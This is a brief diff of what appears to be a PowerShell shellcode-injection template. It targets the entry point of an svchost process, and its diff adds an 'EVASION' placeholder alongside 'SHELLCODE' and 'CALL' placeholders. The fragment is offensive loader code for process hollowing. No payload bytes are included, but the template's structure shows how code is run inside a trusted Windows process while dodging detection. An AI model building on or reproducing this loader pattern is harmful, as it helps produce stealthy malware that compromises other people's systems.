@@ -150,8 +150,9 @@ $tw = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((L
 [UIntPtr]$addressOfEntryPoint = [UIntPtr]($entrypoint_rva + [UInt64]$svchostBase);
 [Int32]$lpNumberOfBytesWritten = 0
 
+//####EVASION####
 
-[Byte[]] $buf = ####SHELLCODE####
+$buf = ####SHELLCODE####
 
 //####CALL####
 
